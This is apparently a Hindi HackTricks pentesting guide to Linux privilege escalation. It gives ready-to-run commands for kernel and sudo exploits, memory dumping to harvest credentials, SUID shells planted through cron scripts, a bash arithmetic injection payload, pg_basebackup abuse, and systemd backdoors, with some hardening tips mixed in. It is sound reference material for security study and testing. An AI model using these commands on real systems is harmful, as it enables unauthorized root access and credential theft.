# Linux विशेषाधिकार वृद्धि

{{#include ../../banners/hacktricks-training.md}}

## सिस्टम जानकारी

### OS जानकारी

आइए OS के बारे में कुछ जानकारी हासिल करना शुरू करें जो चल रहा है
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

यदि आपके पास `PATH` वैरिएबल के अंदर किसी भी folder पर **write permissions** हैं, तो आप कुछ libraries या binaries को hijack कर सकते हैं:
```bash
echo $PATH
```
### वातावरण जानकारी

क्या environment variables में कोई interesting information, passwords या API keys हैं?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

kernel version जांचें और देखें कि क्या ऐसा कोई exploit है जिसका उपयोग privileges escalate करने के लिए किया जा सकता है
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
You can find a good vulnerable kernel list and some already **compiled exploits** here: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) and [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Other sites where you can find some **compiled exploits**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

To extract all the vulnerable kernel versions from that web you can do:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Tools that could help to search for kernel exploits are:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (victim में execute करें, केवल kernel 2.x के लिए exploits check करता है)

हमेशा **kernel version को Google में search करें**, हो सकता है आपका kernel version किसी kernel exploit में लिखा हो और तब आपको यकीन हो जाएगा कि यह exploit valid है।

Additional kernel exploitation techniques:

{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo संस्करण

इनमें दिखने वाले vulnerable sudo versions के आधार पर:
```bash
searchsploit sudo
```
आप इस grep का उपयोग करके देख सकते हैं कि sudo version vulnerable है या नहीं।
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

1.9.17p1 से पहले के Sudo versions (**1.9.14 - 1.9.17 < 1.9.17p1**) unprivileged local users को root तक अपने privileges escalate करने देते हैं via sudo `--chroot` option, जब `/etc/nsswitch.conf` file user controlled directory से use की जाती है।

यहाँ exploit करने के लिए एक [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) है उस [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463) के लिए। exploit चलाने से पहले, सुनिश्चित करें कि आपका `sudo` version vulnerable है और `chroot` feature support करता है।

अधिक जानकारी के लिए, original [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/) देखें

### Sudo host-based rules bypass (CVE-2025-32462)

1.9.17p1 से पहले का Sudo (reported affected range: **1.8.8–1.9.17**) **sudo -h <host>** से लिए गए **user-supplied hostname** का उपयोग करके host-based sudoers rules evaluate कर सकता है, बजाय **real hostname** के। अगर sudoers किसी दूसरे host पर broader privileges देता है, तो आप local रूप से उस host को **spoof** कर सकते हैं।

Requirements:
- Vulnerable sudo version
- Host-specific sudoers rules (host current hostname या `ALL` नहीं होना चाहिए)

Example sudoers pattern:
```
Host_Alias     SERVERS = devbox, prodbox
Host_Alias     PROD    = prodbox
alice          SERVERS, !PROD = NOPASSWD:ALL
```
मान्य host को spoof करके exploit करें:
```bash
sudo -h devbox id
sudo -h devbox -i
```
यदि spoofed name का resolution blocks होता है, तो उसे `/etc/hosts` में जोड़ें या ऐसा hostname use करें जो पहले से logs/configs में मौजूद हो, ताकि DNS lookups से बचा जा सके।

#### sudo < v1.8.28

From @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg signature verification failed

इस vuln का exploit करने के **example** के लिए **HTB** के **smasher2 box** को check करें
```bash
dmesg 2>/dev/null | grep "signature"
```
### अधिक system enumeration
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## संभावित defenses की enumeration करें

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## कंटेनर ब्रेकआउट

यदि आप किसी container के अंदर हैं, तो निम्न container-security section से शुरू करें और फिर runtime-specific abuse pages में pivot करें:


{{#ref}}
container-security/
{{#endref}}

## Drives

जांचें कि **क्या mounted है और क्या unmounted है**, कहाँ और क्यों। अगर कुछ unmounted है, तो आप उसे mount करने की कोशिश कर सकते हैं और private info के लिए जांच सकते हैं
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## उपयोगी software

उपयोगी binaries की सूची बनाएं
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
साथ ही, जांचें कि **कोई compiler installed है**. यह उपयोगी है यदि आपको कोई kernel exploit use करना हो, क्योंकि इसे उसी machine पर compile करना recommended है जहाँ आप इसे use करने वाले हैं (या किसी similar machine पर)
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### कमजोर सॉफ़्टवेयर इंस्टॉल्ड

**installed packages and services** के **version** की जांच करें। हो सकता है कोई पुराना Nagios version (उदाहरण के लिए) हो, जिसका उपयोग privilege escalation के लिए किया जा सके…\
अधिक संदिग्ध installed software के version को manually जांचना recommended है।
```bash
dpkg -l #Debian
rpm -qa #Centos
```
यदि आपके पास मशीन का SSH access है, तो आप मशीन के अंदर installed outdated और vulnerable software को check करने के लिए **openVAS** का भी use कर सकते हैं।

> [!NOTE] > _ध्यान दें कि ये commands बहुत सारी information दिखाएँगी जो ज़्यादातर useless होगी, इसलिए OpenVAS या similar जैसे कुछ applications recommend किए जाते हैं, जो check करेंगे कि installed software version known exploits के लिए vulnerable है या नहीं_

## Processes

देखें कि **कौन-से processes** execute हो रहे हैं और check करें कि क्या किसी process के पास **उससे ज़्यादा privileges** हैं जितने होने चाहिए (maybe root द्वारा execute किया गया tomcat?)
```bash
ps aux
ps -ef
top -n 1
```
हमेशा संभावित [**electron/cef/chromium debuggers** running](electron-cef-chromium-debugger-abuse.md) की जाँच करें, आप इसका दुरुपयोग करके privileges escalate कर सकते हैं। **Linpeas** इन्हें process की command line के अंदर `--inspect` parameter की जाँच करके detect करता है।\
साथ ही processes binaries पर अपने privileges भी check करें, शायद आप किसी और की चीज़ overwrite कर सकें।

### Cross-user parent-child chains

एक child process जो अपने parent से **different user** के तहत चल रहा है, वह अपने आप में malicious नहीं होता, लेकिन यह एक उपयोगी **triage signal** है। कुछ transitions expected होते हैं (`root` का किसी service user को spawn करना, login managers का session processes बनाना), लेकिन unusual chains wrappers, debug helpers, persistence, या weak runtime trust boundaries को reveal कर सकते हैं।

Quick review:
```bash
ps -eo pid,ppid,user,comm,args --sort=ppid
pstree -alp
```
यदि आप एक surprising chain पाते हैं, तो parent command line और उसके behavior को प्रभावित करने वाली सभी files (`config`, `EnvironmentFile`, helper scripts, working directory, writable arguments) inspect करें। कई real privesc paths में child खुद writable नहीं था, लेकिन **parent-controlled config** या helper chain writable था।

### Deleted executables and deleted-open files

Runtime artifacts अक्सर deletion के **बाद भी** accessible रहते हैं। यह privilege escalation और उस process से evidence recover करने, दोनों के लिए useful है, जिसके पास पहले से sensitive files open हैं।

Deleted executables के लिए check करें:
```bash
pid=<PID>
ls -l /proc/$pid/exe
readlink /proc/$pid/exe
tr '\0' ' ' </proc/$pid/cmdline; echo
```
If `/proc/<PID>/exe` `(deleted)` की ओर point करता है, तो process अभी भी memory से पुरानी binary image चला रहा है। यह investigate करने का strong signal है क्योंकि:

- removed executable में interesting strings या credentials हो सकते हैं
- running process अभी भी useful file descriptors expose कर सकता है
- एक deleted privileged binary हालिया tampering या attempted cleanup का संकेत दे सकता है

deleted-open files को globally collect करें:
```bash
lsof +L1
```
यदि आपको कोई interesting descriptor मिले, तो उसे सीधे recover करें:
```bash
ls -l /proc/<PID>/fd
cat /proc/<PID>/fd/<FD>
```
यह विशेष रूप से मूल्यवान है जब किसी process के पास अभी भी एक deleted secret, script, database export, या flag file open हो।

### Process monitoring

आप [**pspy**](https://github.com/DominicBreuker/pspy) जैसे tools का उपयोग processes को monitor करने के लिए कर सकते हैं। यह उन vulnerable processes की पहचान करने में बहुत उपयोगी हो सकता है जो बार-बार execute हो रहे हों या जब requirements का एक set पूरा हो।

### Process memory

एक server की कुछ services **credentials को memory के अंदर clear text में save** करती हैं।\
आमतौर पर, दूसरे users के processes की memory पढ़ने के लिए आपको **root privileges** चाहिए होते हैं, इसलिए यह ज़्यादातर तब उपयोगी होता है जब आप पहले से root हों और और अधिक credentials खोजने चाहते हों।\
हालाँकि, याद रखें कि **as a regular user आप अपने own processes की memory पढ़ सकते हैं**।

> [!WARNING]
> ध्यान दें कि आजकल अधिकांश machines **default रूप से ptrace की अनुमति नहीं देतीं** जिसका मतलब है कि आप अपने unprivileged user से संबंधित other processes को dump नहीं कर सकते।
>
> फ़ाइल _**/proc/sys/kernel/yama/ptrace_scope**_ ptrace की accessibility को control करती है:
>
> - **kernel.yama.ptrace_scope = 0**: सभी processes को debug किया जा सकता है, बशर्ते उनका uid same हो। यह ptracing के काम करने का classical तरीका है।
> - **kernel.yama.ptrace_scope = 1**: केवल parent process को debug किया जा सकता है।
> - **kernel.yama.ptrace_scope = 2**: केवल admin ptrace का उपयोग कर सकता है, क्योंकि इसके लिए CAP_SYS_PTRACE capability आवश्यक होती है।
> - **kernel.yama.ptrace_scope = 3**: किसी भी process को ptrace से trace नहीं किया जा सकता। एक बार set होने पर, ptracing को फिर से enable करने के लिए reboot की आवश्यकता होती है।

#### GDB

यदि आपके पास किसी FTP service (उदाहरण के लिए) की memory तक पहुंच है, तो आप Heap प्राप्त कर सकते हैं और उसके अंदर credentials search कर सकते हैं।
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB स्क्रिप्ट
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

किसी दिए गए process ID के लिए, **maps दिखाता है कि memory उस process के** virtual address space के भीतर कैसे mapped है; यह **हर mapped region की permissions** भी दिखाता है। **mem** pseudo file **processes की memory को ही expose करता है**। **maps** file से हमें पता चलता है कि कौन-से **memory regions readable** हैं और उनके offsets क्या हैं। हम इस जानकारी का उपयोग **mem file में seek करने और सभी readable regions को एक file में dump करने** के लिए करते हैं।
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` सिस्टम की **physical** memory तक पहुंच प्रदान करता है, virtual memory तक नहीं। Kernel का virtual address space /dev/kmem का उपयोग करके access किया जा सकता है।\
आम तौर पर, `/dev/mem` केवल **root** और **kmem** group द्वारा readable होता है।
```
strings /dev/mem -n10 | grep -i PASS
```
### linux के लिए ProcDump

ProcDump Windows के लिए Sysinternals suite के classic ProcDump tool का Linux reimagining है। इसे [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux) में प्राप्त करें
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Tools

किसी process memory को dump करने के लिए आप यह use कर सकते हैं:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_आप manually root requirements हटा सकते हैं और उस process को dump कर सकते हैं जो आपके owned है
- Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root required है)

### Credentials from Process Memory

#### Manual example

अगर आपको पता चलता है कि authenticator process चल रहा है:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
आप process को dump कर सकते हैं (memory of a process को dump करने के अलग-अलग तरीकों के लिए before sections देखें) और memory के अंदर credentials search कर सकते हैं:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

The tool [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) **memory से clear text credentials चुराएगा** और कुछ **well known files** से भी। इसे properly काम करने के लिए root privileges की जरूरत होती है।

| Feature                                           | Process Name         |
| ------------------------------------------------- | -------------------- |
| GDM password (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### Search Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Scheduled/Cron jobs

### Crontab UI (alseambusher) चल रहा है root के रूप में – web-based scheduler privesc

अगर एक web “Crontab UI” panel (alseambusher/crontab-ui) root के रूप में चलता है और केवल loopback पर bound है, तो भी आप SSH local port-forwarding के जरिए उसे reach कर सकते हैं और privilege escalate करने के लिए एक privileged job बना सकते हैं।

Typical chain
- loopback-only port discover करें (जैसे, 127.0.0.1:8000) और Basic-Auth realm via `ss -ntlp` / `curl -v localhost:8000`
- operational artifacts में credentials खोजें:
- Backups/scripts with `zip -P <password>`
- systemd unit exposing `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Tunnel and login:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- एक high-priv job बनाएं और तुरंत चलाएं (SUID shell drop करता है):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- इसका उपयोग करें:
```bash
/tmp/rootshell -p   # root shell
```
Hardening
- Crontab UI को root के रूप में न चलाएं; इसे dedicated user और minimal permissions के साथ constrain करें
- localhost पर bind करें और additionally firewall/VPN के जरिए access restrict करें; passwords reuse न करें
- unit files में secrets embed करने से बचें; secret stores या root-only EnvironmentFile का use करें
- on-demand job executions के लिए audit/logging enable करें



Check करें कि कोई scheduled job vulnerable है या नहीं। शायद आप root द्वारा execute हो रहे script का फायदा उठा सकते हैं (wildcard vuln? क्या files modify कर सकते हैं जिन्हें root use करता है? symlinks use करें? उस directory में specific files create करें जिसका root use करता है?)
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
यदि `run-parts` का उपयोग किया जाता है, तो जांचें कि कौन से नाम वास्तव में execute होंगे:
```bash
run-parts --test /etc/cron.hourly
run-parts --test /etc/cron.daily
```
यह false positives से बचाता है। एक writable periodic directory केवल तभी उपयोगी है जब आपके payload filename स्थानीय `run-parts` rules से match करता हो।

### Cron path

उदाहरण के लिए, _/etc/crontab_ के अंदर आप PATH पा सकते हैं: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_ध्यान दें कि user "user" के पास /home/user पर writing privileges हैं_)

अगर इस crontab के अंदर root user path set किए बिना कोई command या script execute करने की कोशिश करता है। उदाहरण के लिए: _\* \* \* \* root overwrite.sh_\
तो, आप इसका उपयोग करके root shell प्राप्त कर सकते हैं:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### एक script के साथ Cron using a wildcard (Wildcard Injection)

अगर root द्वारा एक script execute की जाती है और उसमें किसी command के अंदर “**\***” होता है, तो आप इसका उपयोग unexpected चीज़ें करने के लिए exploit कर सकते हैं (जैसे privesc)। Example:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**यदि wildcard से पहले कोई path हो जैसे** _**/some/path/\***_ **, तो यह vulnerable नहीं है (even** _**./\***_ **भी नहीं).**

और wildcard exploitation के लिए और tricks पढ़ने के लिए यह page देखें:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash, ((...)), $((...)) और let में arithmetic evaluation से पहले parameter expansion और command substitution करता है। अगर कोई root cron/parser untrusted log fields पढ़कर उन्हें arithmetic context में feed करता है, तो attacker एक command substitution $(...) inject कर सकता है जो cron चलने पर root के रूप में execute होगी।

- Why it works: Bash में expansions इस order में होते हैं: parameter/variable expansion, command substitution, arithmetic expansion, फिर word splitting और pathname expansion. इसलिए `$(/bin/bash -c 'id > /tmp/pwn')0` जैसी value पहले substitute होती है (command run होती है), फिर बचा हुआ numeric `0` arithmetic के लिए use होता है, इसलिए script बिना errors के continue करती है।

- Typical vulnerable pattern:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation: attacker-controlled text को parsed log में लिखवाएँ ताकि numeric-looking field में command substitution हो और वह एक digit पर end हो। सुनिश्चित करें कि आपका command stdout पर print न करे (या उसे redirect कर दें) ताकि arithmetic valid रहे।
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

अगर आप root द्वारा execute होने वाली किसी cron script को **modify** कर सकते हैं, तो आप बहुत आसानी से shell पा सकते हैं:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
यदि root द्वारा निष्पादित script एक **ऐसी directory** का उपयोग करता है जहाँ आपकी full access है, तो शायद उस folder को delete करना और **उसकी जगह किसी दूसरी folder की symlink folder बनाना** उपयोगी हो सकता है, जो आपकी controlled script serve कर रही हो
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Symlink validation and safer file handling

जब path के जरिए files को read या write करने वाले privileged scripts/binaries की review करते हैं, तो verify करें कि links को कैसे handle किया जाता है:

- `stat()` एक symlink को follow करता है और target का metadata return करता है।
- `lstat()` link के खुद के metadata को return करता है।
- `readlink -f` और `namei -l` final target को resolve करने और path के हर component की permissions दिखाने में मदद करते हैं।
```bash
readlink -f /path/to/link
namei -l /path/to/link
```
दूसरों/डेवलपर्स के लिए, symlink tricks के खिलाफ safer patterns में शामिल हैं:

- `O_EXCL` के साथ `O_CREAT`: अगर path पहले से मौजूद है तो fail करें (attacker द्वारा पहले से बनाए गए links/files को block करता है)।
- `openat()`: trusted directory file descriptor के relative रूप में operate करें।
- `mkstemp()`: secure permissions के साथ temporary files को atomically create करें।

### Writable payloads के साथ Custom-signed cron binaries
Blue teams कभी-कभी cron-driven binaries को "sign" करते हैं, एक custom ELF section dump करके और root के रूप में execute करने से पहले vendor string को grep करके। अगर वह binary group-writable है (जैसे, `/opt/AV/periodic-checks/monitor` owned by `root:devs 770`) और आप signing material leak कर सकते हैं, तो आप section forge करके cron task hijack कर सकते हैं:

1. Verification flow capture करने के लिए `pspy` का उपयोग करें। Era में, root ने `objcopy --dump-section .text_sig=text_sig_section.bin monitor` चलाया, उसके बाद `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin` और फिर file execute की।
2. leaked key/config (`signing.zip` से) का उपयोग करके expected certificate recreate करें:
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. एक malicious replacement बनाएं (जैसे, SUID bash drop करें, अपनी SSH key add करें) और certificate को `.text_sig` में embed करें ताकि grep pass हो:
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. execute bits preserve करते हुए scheduled binary को overwrite करें:
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. अगले cron run का इंतजार करें; जैसे ही naive signature check succeed होता है, आपका payload root के रूप में run होता है।

### Frequent cron jobs

आप processes को monitor करके ऐसे processes खोज सकते हैं जो हर 1, 2 या 5 minutes में execute हो रहे हैं। शायद आप इसका फायदा उठाकर privileges escalate कर सकते हैं।

उदाहरण के लिए, **1 minute के दौरान हर 0.1s monitor करने**, **कम बार execute हुए commands के अनुसार sort करने** और सबसे ज़्यादा execute हुए commands को हटाने के लिए, आप यह कर सकते हैं:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**आप** [**pspy**](https://github.com/DominicBreuker/pspy/releases) **का भी उपयोग कर सकते हैं** (यह शुरू होने वाली हर process की निगरानी करेगा और सूची बनाएगा)।

### Root backups जो attacker-set mode bits को preserve करते हैं (pg_basebackup)

अगर root-owned cron किसी database directory पर, जिसे आप write कर सकते हैं, `pg_basebackup` (या कोई भी recursive copy) चलाता है, तो आप एक **SUID/SGID binary** plant कर सकते हैं जिसे backup output में **root:root** के रूप में, same mode bits के साथ, फिर से copy किया जाएगा।

Typical discovery flow (as a low-priv DB user):
- `pspy` का उपयोग करके एक root cron को spot करें जो हर minute कुछ ऐसा चलाता है: `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/`.
- Confirm करें कि source cluster (e.g., `/var/lib/postgresql/14/main`) आपके लिए writable है और destination (`/opt/backups/current`) job के बाद root-owned हो जाता है।

Exploit:
```bash
# As the DB service user owning the cluster directory
cd /var/lib/postgresql/14/main
cp /bin/bash .
chmod 6777 bash

# Wait for the next root backup run (pg_basebackup preserves permissions)
ls -l /opt/backups/current/bash  # expect -rwsrwsrwx 1 root root ... bash
/opt/backups/current/bash -p    # root shell without dropping privileges
```
यह इसलिए काम करता है क्योंकि `pg_basebackup` क्लस्टर की कॉपी करते समय file mode bits को preserve करता है; जब इसे root द्वारा invoke किया जाता है, तो destination files **root ownership + attacker-chosen SUID/SGID** inherit करते हैं। permissions को बनाए रखने वाली और executable location में लिखने वाली कोई भी similar privileged backup/copy routine vulnerable होती है।

### Invisible cron jobs

एक cronjob बनाना संभव है **comment के बाद carriage return डालकर** (बिना newline character के), और cron job काम करेगा। Example (ध्यान दें carriage return char):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
इस तरह की stealth entry का पता लगाने के लिए, ऐसे tools के साथ cron files inspect करें जो control characters expose करते हैं:
```bash
cat -A /etc/crontab
cat -A /etc/cron.d/*
sed -n 'l' /etc/crontab /etc/cron.d/* 2>/dev/null
xxd /etc/crontab | head
```
## Services

### Writable _.service_ files

Check if you can write any `.service` file, if you can, you **could modify it** so it **executes** your **backdoor when** the service is **started**, **restarted** or **stopped** (maybe you will need to wait until the machine is rebooted).\
For example create your backdoor inside the .service file with **`ExecStart=/tmp/script.sh`**

### Writable service binaries

Keep in mind that if you have **write permissions over binaries being executed by services**, you can change them for backdoors so when the services get re-executed the backdoors will be executed.

### systemd PATH - Relative Paths

You can see the PATH used by **systemd** with:
```bash
systemctl show-environment
```
अगर आप पाते हैं कि आप path के किसी भी folder में **write** कर सकते हैं, तो आप संभवतः **escalate privileges** कर सकते हैं। आपको service configurations files में उपयोग हो रहे **relative paths** खोजने चाहिए, जैसे:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Then, systemd PATH folder के अंदर उसी नाम के साथ एक **executable** बनाएं जैसा relative path binary का नाम है, जिसे आप write कर सकते हैं, और जब service से vulnerable action (**Start**, **Stop**, **Reload**) execute करने को कहा जाएगा, तो आपका **backdoor** execute हो जाएगा (unprivileged users usually services को start/stop नहीं कर सकते, लेकिन `sudo -l` से check करें कि क्या आप इसका use कर सकते हैं).

**Services के बारे में अधिक जानने के लिए `man systemd.service` देखें।**

## **Timers**

**Timers** ऐसे systemd unit files हैं जिनका नाम `**.timer**` पर खत्म होता है और ये `**.service**` files या events को control करते हैं। **Timers** cron के alternative के रूप में use किए जा सकते हैं क्योंकि इनमें calendar time events और monotonic time events के लिए built-in support होता है और इन्हें asynchronously run किया जा सकता है।

आप सभी timers को इस तरह enumerate कर सकते हैं:
```bash
systemctl list-timers --all
```
### Writable timers

यदि आप किसी timer को modify कर सकते हैं, तो आप उसे systemd.unit के कुछ existing objects (जैसे `.service` या `.target`) execute कराने के लिए बना सकते हैं
```bash
Unit=backdoor.service
```
डॉक्यूमेंटेशन में आप पढ़ सकते हैं कि Unit क्या है:

> The unit to activate when this timer elapses. The argument is a unit name, whose suffix is not ".timer". If not specified, this value defaults to a service that has the same name as the timer unit, except for the suffix. (See above.) It is recommended that the unit name that is activated and the unit name of the timer unit are named identically, except for the suffix.

इसलिए, इस permission का abuse करने के लिए आपको चाहिए:

- कोई systemd unit (जैसे `.service`) ढूंढें जो **एक writable binary execute** कर रहा हो
